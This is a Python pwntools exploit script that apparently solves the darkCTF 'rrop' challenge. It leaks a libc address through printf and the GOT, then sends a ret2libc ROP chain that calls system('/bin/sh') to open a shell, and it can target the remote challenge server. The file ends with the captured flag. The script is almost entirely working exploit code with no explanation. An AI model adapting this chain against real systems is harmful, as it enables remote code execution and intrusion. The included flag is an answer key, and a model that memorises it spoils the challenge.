"""
Intended to be a sigrop challenge, but printf was left in for libc leak.
Becomes a normal ret2libc
"""
from pwn import *

binary_path = "./rrop"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break fuck
#break main
#break *0x555555554a13

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc rrop.darkarmy.xyz 7001
        return remote("rrop.darkarmy.xyz", 7001)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


io = start()

io.recvline()

rop = ROP(elf)

rop.raw(0x00000000004005b6)
rop.printf(elf.got.read)
rop.raw(0x00000000004005b6)
rop.main()

payload = flat({
    0xd8: rop.chain()
})

io.clean()
io.sendline(payload)

read_addr = u64(io.recvuntil("Hello", drop=True).ljust(8, b"\0"))
libc.address = read_addr - libc.sym.read

print(f"LIBC: {hex(libc.address)}")

binsh_addr = next(libc.search(b"/bin/sh\0"))

rop = ROP(libc)
rop.raw(0x00000000004005b6)
rop.system(binsh_addr)
rop.exit()

payload = flat({
    0xd8: rop.chain()
})
io.sendline(payload)

io.interactive()

# darkCTF{f1n4lly_y0u_f4k3_s1gn4l_fr4m3_4nd_w0n_gr4n173_w1r3d_m4ch1n3}
